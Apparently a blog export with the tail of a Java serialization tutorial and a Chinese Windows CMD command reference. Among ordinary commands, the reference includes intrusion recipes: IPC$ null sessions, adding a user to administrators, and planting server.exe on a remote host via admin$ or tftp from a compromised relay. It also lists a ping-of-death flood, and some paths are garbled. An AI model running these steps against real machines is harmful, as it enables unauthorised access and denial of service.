class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">        readObj();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过反序列化操作，可以再次将持久化的对象字节流数据通过 IO 转化为 Java 对象，结果如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">cn.wudimanong.serializable.User@6f496d9f</span><br></pre></td></tr></table></figure>

<p>此时，如果我们再次尝试将 User 实现 Serializable 接口的代码部分去掉，发现也无法再文本转换为序列化对象，报错信息为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ava.io.InvalidClassException: cn.wudimanong.serializable.User; <span class="keyword">class</span> <span class="title class_">invalid</span> <span class="keyword">for</span> deserialization</span><br><span class="line">    at java.io.ObjectStreamClass$ExceptionInfo.newInvalidClassException(ObjectStreamClass.java:<span class="number">157</span>)</span><br><span class="line">    at java.io.ObjectStreamClass.checkDeserialize(ObjectStreamClass.java:<span class="number">862</span>)</span><br><span class="line">    at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:<span class="number">2038</span>)</span><br><span class="line">    at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:<span class="number">1568</span>)</span><br><span class="line">    at java.io.ObjectInputStream.readObject(ObjectInputStream.java:<span class="number">428</span>)</span><br><span class="line">    at cn.wudimanong.serializable.SerializableTest.readObj(SerializableTest.java:<span class="number">31</span>)</span><br><span class="line">    at cn.wudimanong.serializable.SerializableTest.main(SerializableTest.java:<span class="number">44</span>)</span><br></pre></td></tr></table></figure>

<p>提示非法类型转换异常，说明在 Java 中如何要实现对象的 IO 读写操作，都必须实现 Serializable 接口，否则代码就会报错!</p>
<h2 id="为什么要定义-serialversionUID-常量"><a href="#为什么要定义-serialversionUID-常量" class="headerlink" title="为什么要定义 serialversionUID 常量"></a><strong>为什么要定义 serialversionUID 常量</strong></h2><p>简单看一下 Serializable 接口的说明： Serializable.java 152行</p>
<p>从说明中我们可以看到，如果我们没有自己声明一个 serialVersionUID 变量,接口会默认生成一个 serialVersionUID</p>
<p>对于 JVM 来说，要进行持久化的类必须要有一个标记，只有持有这个标记 JVM 才允许类创建的对象可以通过其 IO 系统转换为字节数据，从而实现持久化，而这个标记就是 Serializable 接口。而在反序列化的过程中则需要使用 serialVersionUID 来确定由那个类来加载这个对象，所以我们在实现 Serializable 接口的时候，一般还会要去尽量显示地定义 serialVersionUID，如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br></pre></td></tr></table></figure>

<p>在反序列化的过程中，如果接收方为对象加载了一个类，如果该对象的 serialVersionUID 与对应持久化时的类不同，那么反序列化的过程中将会导致 InvalidClassException 异常。例如，在之前反序列化的例子中，我们故意将 User 类的 serialVersionUID 改为 2L，如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">2L</span>;</span><br></pre></td></tr></table></figure>

<p>那么此时，在反序例化时就会导致异常，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.io.InvalidClassException: cn.wudimanong.serializable.User; local <span class="keyword">class</span> <span class="title class_">incompatible</span>: stream <span class="type">classdesc</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1</span>, local <span class="keyword">class</span> <span class="title class_">serialVersionUID</span> = <span class="number">2</span></span><br><span class="line">    at java.io.ObjectStreamClass.initNonProxy(ObjectStreamClass.java:<span class="number">687</span>)</span><br><span class="line">    at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:<span class="number">1880</span>)</span><br><span class="line">    at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:<span class="number">1746</span>)</span><br><span class="line">    at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:<span class="number">2037</span>)</span><br><span class="line">    at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:<span class="number">1568</span>)</span><br><span class="line">    at java.io.ObjectInputStream.readObject(ObjectInputStream.java:<span class="number">428</span>)</span><br><span class="line">    at cn.wudimanong.serializable.SerializableTest.readObj(SerializableTest.java:<span class="number">31</span>)</span><br><span class="line">    at cn.wudimanong.serializable.SerializableTest.main(SerializableTest.java:<span class="number">44</span>)</span><br></pre></td></tr></table></figure>

<p>如果我们在序列化中没有显示地声明 serialVersionUID，则序列化运行时将会根据该类的各个方面计算该类默认的 serialVersionUID 值。</p>
<p>那么默认生成的序列化 ID 有什么作用呢，有些时候，通过改变序列化 ID 可以用来限制某些用户的使用。</p>
<p>但是，Java 官方强烈建议所有要序列化的类都显示地声明 serialVersionUID 字段，因为如果高度依赖于 JVM 默认生成 serialVersionUID，可能会导致其与编译器的实现细节耦合，这样可能会导致在反序列化的过程中发生意外的 InvalidClassException 异常。</p>
<p>因此，为了保证跨不同 Java 编译器实现的 serialVersionUID 值的一致，实现 Serializable 接口的必须显示地声明 serialVersionUID 字段。</p>
<p>此外 serialVersionUID 字段地声明要尽可能使用 private 关键字修饰，这是因为该字段的声明只适用于声明的类，该字段作为成员变量被子类继承是没有用处的!</p>
<p>有个特殊的地方需要注意的是，数组类是不能显示地声明 serialVersionUID 的，因为它们始终具有默认计算的值，不过数组类反序列化过程中也是放弃了匹配 serialVersionUID 值的要求。</p>
<h2 id="静态变量序列化"><a href="#静态变量序列化" class="headerlink" title="静态变量序列化"></a>静态变量序列化</h2><p>串行化只能保存对象的非静态成员交量，不能保存任何的成员方法和静态的成员变量，而且串行化保存的只是变量的值，对于变量的任何修饰符都不能保存。</p>
<p>如果把 Person 类中的 name 定义为 static 类型的话，试图重构，就不能得到原来的值，只能得到 null。说明对静态成员变量值是不保存的。这其实比较容易理解，序列化保存的是对象的状态，静态变量属于类的状态，因此 序列化并不保存静态变量。</p>
<h2 id="transient-关键字"><a href="#transient-关键字" class="headerlink" title="transient 关键字"></a>transient 关键字</h2><p>经常在实现了 Serializable 接口的类中能看见 transient 关键字。这个关键字并不常见。 transient 关键字的作用是：阻止实例中那些用此关键字声明的变量持久化；当对象被反序列化时（从源文件读取字节序列进行重构），这样的实例变量值不会被持久化和恢复。</p>
<p>当某些变量不想被序列化，同是又不适合使用 static 关键字声明，那么此时就需要用 transient 关键字来声明该变量。</p>
<p>例如用 transient 关键字 修饰 name 变量</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">transient</span> String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;name:&quot;</span>+name+<span class="string">&quot;\tage:&quot;</span>+age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在反序列化视图重构对象的时候，作用与 static 变量一样： 输出结果为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">name:<span class="literal">null</span>   age:<span class="number">22</span></span><br></pre></td></tr></table></figure>

<p>在被反序列化后，transient 变量的值被设为初始值，如 int 型的是 0，对象型的是 null。</p>
<p>注：对于某些类型的属性，其状态是瞬时的，这样的属性是无法保存其状态的。例如一个线程属性或需要访问 IO、本地资源、网络资源等的属性，对于这些字段，我们必须用 transient 关键字标明，否则编译器将报措。</p>
<h3 id="序列化中的继承问题"><a href="#序列化中的继承问题" class="headerlink" title="序列化中的继承问题"></a>序列化中的继承问题</h3><ul>
<li>当一个父类实现序列化，子类自动实现序列化，不需要显式实现 Serializable 接口。</li>
<li>一个子类实现了 Serializable 接口，它的父类都没有实现 Serializable 接口，要想将父类对象也序列化，就需要让父类也实现 Serializable 接口。</li>
</ul>
<p>第二种情况中：如果父类不实现 Serializable 接口的话，就需要有默认的无参的构造函数。这是因为一个 Java 对象的构造必须先有父对象，才有子对象，反序列化也不例外。在反序列化时，为了构造父对象，只能调用父类的无参构造函数作为默认的父对象。因此当我们取父对象的变量值时，它的值是调用父类无参构造函数后的值。在这种情况下，在序列化时根据需要在父类无参构造函数中对变量进行初始化，否则的话，父类变量值都是默认声明的值，如 int 型的默认是 0，string 型的默认是 null。</p>
<p>例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">People</span>&#123;</span><br><span class="line">    <span class="type">int</span> num;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">People</span><span class="params">()</span>&#123;&#125;           <span class="comment">//默认的无参构造函数，没有进行初始化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">People</span><span class="params">(<span class="type">int</span> num)</span>&#123;     <span class="comment">//有参构造函数</span></span><br><span class="line">        <span class="built_in">this</span>.num = num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;num:&quot;</span>+num;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">extends</span> <span class="title class_">People</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(<span class="type">int</span> num,String name,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(num);             <span class="comment">//调用父类中的构造函数</span></span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.toString()+<span class="string">&quot;\tname:&quot;</span>+name+<span class="string">&quot;\tage:&quot;</span>+age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在一端写出对象的时候</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">10</span>,<span class="string">&quot;tom&quot;</span>, <span class="number">22</span>); <span class="comment">//调用带参数的构造函数num=10,name = &quot;tim&quot;,age =22</span></span><br><span class="line">System.out.println(person);</span><br><span class="line">oos.writeObject(person);                  <span class="comment">//写出对象</span></span><br></pre></td></tr></table></figure>

<p>在另一端读出对象的时候</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person)ois.readObject(); <span class="comment">//反序列化，调用父类中的无参构函数。</span></span><br><span class="line">System.out.println(person);</span><br></pre></td></tr></table></figure>

<p>输出为</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">num:<span class="number">0</span>   name:tom    age:<span class="number">22</span></span><br></pre></td></tr></table></figure>

<p>发现由于父类中无参构造函数并没有对 num 初始化，所以 num 使用默认值为 0。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>序列化给我们提供了一种技术，用于保存对象的变量。以便于传输。虽然也可以使用别的一些方法实现同样的功能，但是 java 给我们提供的方法使用起来是非常方便的。以上仅仅是我的一些理解，由于本人水平有限，不足之处还请指正。下篇学习 Cloneable 接口的用途。</p>
<h2 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h2><p><a href="https://developer.51cto.com/art/201905/596334.htm">https://developer.51cto.com/art/201905/596334.htm</a></p>
<p><a href="https://blog.csdn.net/u011568312/article/details/57611440">https://blog.csdn.net/u011568312/article/details/57611440</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows CMD命令大全</title>
    <url>/2021/05/15/Windows%20CMD%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8/</url>
    <content><![CDATA[<h1 id="Windows-CMD-命令大全"><a href="#Windows-CMD-命令大全" class="headerlink" title="Windows CMD 命令大全"></a>Windows CMD 命令大全</h1><p><strong>命令简介</strong></p>
<p> cmd 是 command 的缩写.即命令行 。</p>
<p> 虽然随着计算机产业的发展，Windows 操作系统的应用越来越广泛，DOS 面临着被淘汰的命运，但是因为它运行安全、稳定，有的用户还在使用，所以一般 Windows 的各种版本都与其兼容，用户可以在 Windows 系统下运行 DOS，中文版 Windows XP 中的命令提示符进一步提高了与 DOS 下操作命令的兼容性，用户可以在命令提示符直接输入中文调用文件。</p>
<p>在 9x 系统下输入 command 就可以打开命令行.而在 NT 系统上可以输入 cmd 来打开，在 windows2003 后被 cmd 替代，利用 CMD 命令查询系统的信息或者是判断网络的好坏。</p>
<p><strong>运行操作</strong></p>
<p>CMD 命令：开始－&gt;运行－&gt;键入 cmd 或 command(在命令行里可以看到系统版本、文件系统版本)</p>
<p>CMD 命令锦集</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.gpedit.msc-----组策略</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>. sndrec32-------录音机</span><br><span class="line"></span><br><span class="line">　<span class="number">3</span>. Nslookup-------IP地址侦测器 ，是一个 监测网络中 DNS 服务器是否能正确实现域名解析的命令行工具。 它在 Windows NT/2000/XP 中均可使用 , 但在 Windows <span class="number">98</span> 中却没有集成这一个工具。</span><br><span class="line"></span><br><span class="line">　　<span class="number">4</span>. explorer-------打开资源管理器</span><br><span class="line"></span><br><span class="line">　　<span class="number">5</span>. logoff---------注销命令</span><br><span class="line"></span><br><span class="line">　　<span class="number">6</span>. shutdown-------60秒倒计时关机命令</span><br><span class="line"></span><br><span class="line">　　<span class="number">7</span>. lusrmgr.msc----本机用户和组</span><br><span class="line"></span><br><span class="line">　　<span class="number">8</span>. services.msc---本地服务设置</span><br><span class="line"></span><br><span class="line">　　<span class="number">9</span>. oobe/msoobe /a----检查XP是否激活</span><br><span class="line"></span><br><span class="line">　　<span class="number">10</span>. notepad--------打开记事本</span><br><span class="line"></span><br><span class="line">　　<span class="number">11</span>. cleanmgr-------垃圾整理</span><br><span class="line"></span><br><span class="line">　　<span class="number">12</span>. net start messenger----开始信使服务</span><br><span class="line"></span><br><span class="line">　　<span class="number">13</span>. compmgmt.msc---计算机管理</span><br><span class="line"></span><br><span class="line">　　<span class="number">14</span>. net stop messenger-----停止信使服务</span><br><span class="line"></span><br><span class="line">　　<span class="number">15</span>. conf-----------启动netmeeting</span><br><span class="line"></span><br><span class="line">　　<span class="number">16</span>. dvdplay--------DVD播放器</span><br><span class="line"></span><br><span class="line">　　<span class="number">17</span>. charmap--------启动字符映射表</span><br><span class="line"></span><br><span class="line">　　<span class="number">18</span>. diskmgmt.msc---磁盘管理实用程序</span><br><span class="line"></span><br><span class="line">　　<span class="number">19</span>. calc-----------启动计算器</span><br><span class="line"></span><br><span class="line">　　<span class="number">20</span>. dfrg.msc-------磁盘碎片整理程序</span><br><span class="line"></span><br><span class="line">　　<span class="number">21</span>. chkdsk.exe-----Chkdsk磁盘检查</span><br><span class="line"></span><br><span class="line">　　<span class="number">22</span>. devmgmt.msc--- 设备管理器</span><br><span class="line"></span><br><span class="line">　　<span class="number">23</span>. regsvr32 /u *.dll----停止dll文件运行</span><br><span class="line"></span><br><span class="line">　　<span class="number">24</span>. drwtsn32------ 系统医生</span><br><span class="line"></span><br><span class="line">　　<span class="number">25</span>. rononce -p----15秒关机</span><br><span class="line"></span><br><span class="line">　　<span class="number">26</span>. dxdiag---------检查DirectX信息</span><br><span class="line"></span><br><span class="line">　　<span class="number">27</span>. regedt32-------注册表编辑器</span><br><span class="line"></span><br><span class="line">　　<span class="number">28</span>. Msconfig.exe---系统配置实用程序</span><br><span class="line"></span><br><span class="line">　　<span class="number">29</span>. rsop.msc-------组策略结果集</span><br><span class="line"></span><br><span class="line">　　<span class="number">30</span>. mem.exe--------显示内存使用情况</span><br><span class="line"></span><br><span class="line">　　<span class="number">31</span>. regedit.exe----注册表</span><br><span class="line"></span><br><span class="line">　　<span class="number">32</span>. winchat--------XP自带局域网聊天</span><br><span class="line"></span><br><span class="line">　　<span class="number">33</span>. progman--------程序管理器</span><br><span class="line"></span><br><span class="line">　　<span class="number">34</span>. winmsd---------系统信息</span><br><span class="line"></span><br><span class="line">　　<span class="number">35</span>. perfmon.msc----计算机性能监测程序</span><br><span class="line"></span><br><span class="line">　　<span class="number">36</span>. winver---------检查Windows版本</span><br><span class="line"></span><br><span class="line">　　<span class="number">37</span>. sfc /scannow-----扫描错误并复原</span><br><span class="line"></span><br><span class="line">　　<span class="number">38</span>. taskmgr-----任务管理器（<span class="number">2000</span>/xp/2003</span><br><span class="line"></span><br><span class="line">　　<span class="number">40</span>. wmimgmt.msc----打开windows管理体系结构(<span class="name">WMI</span>)</span><br><span class="line"></span><br><span class="line">　　<span class="number">41</span>. wupdmgr--------windows更新程序</span><br><span class="line"></span><br><span class="line">　　<span class="number">42</span>. wscript--------windows脚本宿主设置</span><br><span class="line"></span><br><span class="line">　　<span class="number">43</span>. write----------写字板</span><br><span class="line"></span><br><span class="line">　　<span class="number">45</span>. wiaacmgr-------扫描仪和照相机向导</span><br><span class="line"></span><br><span class="line">　　<span class="number">46</span>. winchat--------XP自带局域网聊天</span><br><span class="line"></span><br><span class="line">　　<span class="number">49</span>. mplayer2-------简易widnows media player</span><br><span class="line"></span><br><span class="line">　　<span class="number">50</span>. mspaint--------画图板</span><br><span class="line"></span><br><span class="line">　　<span class="number">51</span>. mstsc----------远程桌面连接</span><br><span class="line"></span><br><span class="line">　　<span class="number">53</span>. magnify--------放大镜实用程序</span><br><span class="line"></span><br><span class="line">　　<span class="number">54</span>. mmc------------打开控制台</span><br><span class="line"></span><br><span class="line">　　<span class="number">55</span>. mobsync--------同步命令</span><br><span class="line"></span><br><span class="line">　　<span class="number">57</span>. iexpress-------木马捆绑工具，系统自带</span><br><span class="line"></span><br><span class="line">　　<span class="number">58</span>. fsmgmt.msc-----共享文件夹管理器</span><br><span class="line"></span><br><span class="line">　　<span class="number">59</span>. utilman--------辅助工具管理器</span><br><span class="line"></span><br><span class="line">　　<span class="number">61</span>. dcomcnfg-------打开系统组件服务</span><br><span class="line"></span><br><span class="line">　　<span class="number">62</span>. ddeshare-------打开DDE共享设置</span><br><span class="line"></span><br><span class="line">　　<span class="number">110</span>. osk------------打开屏幕键盘</span><br><span class="line"></span><br><span class="line">　　<span class="number">111</span>. odbcad32-------ODBC数据源管理器</span><br><span class="line"></span><br><span class="line">　　<span class="number">112</span>. oobe/msoobe /a----检查XP是否激活</span><br><span class="line"></span><br><span class="line">　　<span class="number">68</span>. ntbackup-------系统备份和还原</span><br><span class="line"></span><br><span class="line">　　<span class="number">69</span>. narrator-------屏幕“讲述人”</span><br><span class="line"></span><br><span class="line">　　<span class="number">70</span>. ntmsmgr.msc----移动存储管理器</span><br><span class="line"></span><br><span class="line">　　<span class="number">71</span>. ntmsoprq.msc---移动存储管理员操作请求</span><br><span class="line"></span><br><span class="line">　　<span class="number">72</span>. netstat -an----(<span class="name">TC</span>)命令检查接口</span><br><span class="line"></span><br><span class="line">　　<span class="number">73</span>. syncapp--------创建一个公文包</span><br><span class="line"></span><br><span class="line">　　<span class="number">74</span>. sysedit--------系统配置编辑器</span><br><span class="line"></span><br><span class="line">　　<span class="number">75</span>. sigverif-------文件签名验证程序</span><br><span class="line"></span><br><span class="line">　　<span class="number">76</span>. ciadv.msc------索引服务程序</span><br><span class="line"></span><br><span class="line">　　<span class="number">77</span>. shrpubw--------创建共享文件夹</span><br><span class="line"></span><br><span class="line">　　<span class="number">78</span>. secpol.msc-----本地安全策略</span><br><span class="line"></span><br><span class="line">　　<span class="number">79</span>. syskey---------系统加密，一旦加密就不能解开，保护windows xp系统的双重密码</span><br><span class="line"></span><br><span class="line">　　<span class="number">80</span>. services.msc---本地服务设置</span><br><span class="line"></span><br><span class="line">　　<span class="number">81</span>. Sndvol32-------音量控制程序</span><br><span class="line"></span><br><span class="line">　　<span class="number">82</span>. sfc.exe--------系统文件检查器</span><br><span class="line"></span><br><span class="line">　　<span class="number">83</span>. sfc /scannow---windows文件保护</span><br><span class="line"></span><br><span class="line">　　<span class="number">84</span>. ciadv.msc------索引服务程序</span><br><span class="line"></span><br><span class="line">　　<span class="number">85</span>. tourstart------xp简介（安装完成后出现的漫游xp程序）</span><br><span class="line"></span><br><span class="line">　　<span class="number">86</span>. taskmgr--------任务管理器</span><br><span class="line"></span><br><span class="line">　　<span class="number">87</span>. eventvwr-------事件查看器</span><br><span class="line"></span><br><span class="line">　　<span class="number">88</span>. eudcedit-------造字程序</span><br><span class="line"></span><br><span class="line">　　<span class="number">89</span>. compmgmt.msc---计算机管理</span><br><span class="line"></span><br><span class="line">　　<span class="number">90</span>. packager-------对象包装程序</span><br><span class="line"></span><br><span class="line">　　<span class="number">91</span>. perfmon.msc----计算机性能监测程序</span><br><span class="line"></span><br><span class="line">　　<span class="number">92</span>. charmap--------启动字符映射表</span><br><span class="line"></span><br><span class="line">　　<span class="number">93</span>. cliconfg-------SQL SERVER 客户端网络实用程序</span><br><span class="line"></span><br><span class="line">　　<span class="number">94</span>. Clipbrd--------剪贴板查看器</span><br><span class="line"></span><br><span class="line">　　<span class="number">95</span>. conf-----------启动netmeeting</span><br><span class="line"></span><br><span class="line">　　<span class="number">96</span>. certmgr.msc----证书管理实用程序</span><br><span class="line"></span><br><span class="line">　　<span class="number">97</span>. regsvr32 /u *.dll----停止dll文件运行</span><br><span class="line"></span><br><span class="line">　　<span class="number">98</span>. regsvr32 /u zipfldr.dll------取消ZIP支持</span><br><span class="line"></span><br><span class="line">　　<span class="number">99</span>. cmd.exe--------CMD命令提示符</span><br></pre></td></tr></table></figure>

<h2 id="操作详解"><a href="#操作详解" class="headerlink" title="操作详解"></a>操作详解</h2><p>net use ipipc$ “ “ &#x2F;user:” “ 建立 IPC 空链接</p>
<p>net use ipipc$ “密码” &#x2F;user:”用户名” 建立 IPC 非空链接</p>
<p>net use h: ipc$ “密码” &#x2F;user:”用户名” 直接登陆后映射对方 C：到本地为 H:</p>
<p>net use h: ipc$ 登陆后映射对方 C：到本地为 H:</p>
<p>net use ipipc$ &#x2F;del 删除 IPC 链接</p>
<p>net use h: &#x2F;del 删除映射对方到本地的为 H:的映射</p>
<p>net user 用户名　密码　&#x2F;add 建立用户</p>
<p>net user guest &#x2F;active:yes 激活 guest 用户</p>
<p>net user 查看有哪些用户</p>
<p>net user 帐户名 查看帐户的属性</p>
<p>net localgroup administrators 用户名 &#x2F;add 把“用户”添加到管理员中使其具有管理员权限</p>
<p>net start 查看开启了哪些服务</p>
<p>net start 服务名　开启服务；(如:net start telnet， net start schedule)</p>
<p>net stop 服务名 停止某服务</p>
<p>net time 目标 ip 查看对方时间</p>
<p>net time 目标 ip &#x2F;set 设置本地计算机时间与“目标 IP”主机的时间同步,加上参数&#x2F;yes 可取消确认信息</p>
<p>net view 查看本地局域网内开启了哪些共享</p>
<p>net view ip 查看对方局域网内开启了哪些共享</p>
<p>net config 显示系统网络设置</p>
<p>net logoff 断开连接的共享</p>
<p>net pause 服务名 暂停某服务</p>
<p>net send ip “文本信息” 向对方发信息</p>
<p>net ver 局域网内正在使用的网络连接类型和信息</p>
<p>net share 查看本地开启的共享</p>
<p>net share ipc$ 开启 ipc$共享</p>
<p>net share ipc$ &#x2F;del 删除 ipc$共享</p>
<p>net share c$ &#x2F;del 删除 C：共享</p>
<p>net user guest 12345 用 guest 用户登陆后用将密码改为 12345</p>
<p>net password 密码 更改系统登陆密码</p>
<p>netstat -a 查看开启了哪些端口,常用 netstat -an</p>
<p>netstat -n 查看端口的网络连接情况，常用 netstat -an</p>
<p>netstat -v 查看正在进行的工作</p>
<p>netstat -p 协议名 例：netstat -p tcq&#x2F;ip 查看某协议使用情况</p>
<p>netstat -s 查看正在使用的所有协议使用情况</p>
<p>nbtstat -A ip 对方 136 到 139 其中一个端口开了的话，就可查看对方最近登陆的用户名</p>
<p>tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w 数字”用于设置超时间隔。</p>
<p>ping ip(或域名) 向对方主机发送默认大小为 32 字节的数据，参数：“-l[空格]数据包大小”；“-n 发送数据次数”；“-t”指一直 ping。</p>
<p>ping -t -l 65550 ip 死亡之 ping(发送大于 64K 的文件并一直 ping 就成了死亡之 ping)</p>
<p>ipconfig (winipcfg) 用于 windows NT 及 XP(windows 95 98)查看本地 ip 地址，ipconfig 可用参数“&#x2F;all”显示全部配置信息</p>
<p>tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的 Support&#x2F;tools 文件夹内)</p>
<p>kill -F 进程名 加-F 参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的 Support&#x2F;tools 文件夹内)</p>
<p>del -F 文件名 加-F 参数后就可删除只读文件,&#x2F;AR、&#x2F;AH、&#x2F;AS、&#x2F;AA 分别表示删除只读、隐藏、系统、存档文件，&#x2F;A-R、&#x2F;A-H、&#x2F;A-S、&#x2F;A-A 表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL&#x2F;AR _._”表示删除当前目录下所有只读文件，“DEL&#x2F;A-S _._”表示删除当前目录下除系统文件以外的所有文件</p>
<p>del &#x2F;S &#x2F;Q 目录 或用：rmdir &#x2F;s &#x2F;Q 目录 &#x2F;S 删除目录及目录下的所有子目录和文件。同时使用参数&#x2F;Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）</p>
<p>move 盘符路径要移动的文件名　存放移动文件的路径移动后文件名 移动文件,用参数&#x2F;y 将取消确认移动目录存在相同文件的提示就直接覆盖</p>
<p>fc one.txt two.txt &gt; 3st.txt 对比二个文件并把不同之处输出到 3st.txt 文件中，”&gt; “和”&gt; &gt;” 是重定向命令</p>
<p>at id 号 开启已注册的某个计划任务</p>
<p>at &#x2F;delete 停止所有计划任务，用参数&#x2F;yes 则不需要确认就直接停止</p>
<p>at id 号 &#x2F;delete 停止某个已注册的计划任务</p>
<p>at 查看所有的计划任务</p>
<p>at ip time 程序名(或一个命令) &#x2F;r 在某时间运行对方某程序并重新启动计算机</p>
<p>finger username <a href="/host">@host </a> 查看最近有哪些用户登陆</p>
<p>telnet ip 端口 远和登陆服务器,默认端口为 23</p>
<p>open ip 连接到 IP（属 telnet 登陆后的命令）</p>
<p>telnet 在本机上直接键入 telnet 将进入本机的 telnet</p>
<p>copy 路径文件名 1 　路径文件名 2 &#x2F;y 复制文件 1 到指定的目录为文件 2，用参数&#x2F;y 就同时取消确认你要改写一份现存目录文件</p>
<p>copy c:srv.exe ipadmin$ 复制本地 c:srv.exe 到对方的 admin 下</p>
<p>copy 1st.jpg&#x2F;b+2st.txt&#x2F;a 3st.jpg 将 2st.txt 的内容藏身到 1st.jpg 中生成 3st.jpg 新的文件，注：2st.txt 文件头要空三排，参数：&#x2F;b 指二进制文件，&#x2F;a 指 ASCLL 格式文件</p>
<p>copy ipadmin<img src="https://g.yuque.com/gr/latex?svv.exe%20c:%20%E6%88%96:copyipadmin#card=math&code=svv.exe%20c%3A%20%E6%88%96%3Acopyipadmin"><em>.</em> 复制对方 admini$共享下的 srv.exe 文件（所有文件）至本地 C：</p>
<p>xcopy 要复制的文件或目录树　目标地址目录名 复制文件和目录树，用参数&#x2F;Y 将不提示覆盖相同文件</p>
<p>用参数&#x2F;e 才可连目录下的子目录一起复制到目标地址下。</p>
<p>tftp -i 自己 IP(用肉机作跳板时这用肉机 IP) get server.exe c:server.exe 登陆后，将“IP”的 server.exe 下载到目标主机 c:server.exe 参数：-i 指以二进制模式传送，如传送 exe 文件时用，如不加-i 则以 ASCII 模式（传送文本文件模式）进行传送</p>
<p>tftp -i 对方 IP 　 put c:server.exe 登陆后，上传本地 c:server.exe 至主机</p>
<p>ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为 21。bin 指用二进制方式传送（可执行文件进）；默认为 ASCII 格式传送(文本文件时)</p>
<p>route print 显示出 IP 路由，将主要显示网络地址 Network addres，子网掩码 Netmask，网关地址 Gateway addres，接口地址 Interface</p>
<p>arp 查看和处理 ARP 缓存，ARP 是名字解析的意思，负责把一个 IP 解析成一个物理性的 MAC 地址。arp -a 将显示出全部信息</p>
<p>start 程序名或命令 &#x2F;max 或&#x2F;min 新开一个新窗口并最大化（最小化）运行某程序或命令</p>
<p>mem 查看 cpu 使用情况</p>
<p>attrib 文件名(目录名) 查看某文件（目录）的属性</p>
